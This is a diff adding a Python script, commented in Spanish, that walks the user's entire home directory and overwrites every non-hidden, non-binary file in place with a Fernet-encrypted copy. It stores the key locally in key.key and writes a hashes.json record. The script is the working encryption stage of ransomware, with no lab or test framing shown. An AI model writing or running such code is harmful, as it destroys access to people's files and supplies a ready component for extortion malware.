@@ -1,0 +1,73 @@
+import os
+from cryptography.fernet import Fernet
+import json
+import hashlib
+
+# Extensiones que NO deben ser encriptadas
+EXTENSIONES_PROHIBIDAS = [
+    '.so', '.bin', '.exe', '.dll', '.o', '.a', '.ko', '.img', '.iso', '.tmp'
+]
+
+def generar_key(path="key.key"):
+    key = Fernet.generate_key()
+    with open(path, "wb") as f:
+        f.write(key)
+    return key
+
+def cargar_key(path="key.key"):
+    with open(path, "rb") as f:
+        return f.read()
+
+def calcular_hash(data):
+    return hashlib.sha256(data).hexdigest()
+
+def es_oculto(path):
+    # Devuelve True si alguna carpeta o archivo en la ruta es oculta (comienza con '.')
+    partes = path.split(os.sep)
+    return any(p.startswith('.') for p in partes if p)
+
+def encontrar_archivos(ruta_home):
+    archivos = []
+    for dirpath, _, filenames in os.walk(ruta_home):
+        if es_oculto(dirpath):
+            continue  # Salta directorios ocultos
+        for nombre in filenames:
+            if nombre.startswith('.'):
+                continue  # Salta archivos ocultos
+            _, ext = os.path.splitext(nombre)
+            if ext.lower() not in EXTENSIONES_PROHIBIDAS:
+                archivos.append(os.path.join(dirpath, nombre))
+    return archivos
+
+def encriptar_archivos(archivos, key):
+    f = Fernet(key)
+    hashes = {}
+    for archivo in archivos:
+        try:
+            with open(archivo, "rb") as file:
+                datos = file.read()
+            hash_original = calcular_hash(datos)
+            datos_cifrados = f.encrypt(datos)
+            with open(archivo, "wb") as file:
+                file.write(datos_cifrados)
+            hashes[archivo] = hash_original
+            print(f"✔ Encriptado: {archivo}")
+        except Exception as e:
+            print(f"✘ Error con {archivo}: {e}")
+    return hashes
+
+if __name__ == "__main__":
+    ruta_home = os.path.expanduser("~")
+    print(f"[🔒] Buscando archivos para encriptar en: {ruta_home}")
+
+    key = generar_key()
+    archivos = encontrar_archivos(ruta_home)
+    print(f"[ℹ️] Archivos encontrados para encriptar: {len(archivos)}")
+
+    hashes = encriptar_archivos(archivos, key)
+
+    with open("hashes.json", "w") as f:
+        json.dump(hashes, f, indent=2)
+
+    print("\n[✅] Encriptación completa.")
+    print("Clave guardada en 'key.key' y hashes en 'hashes.json'")
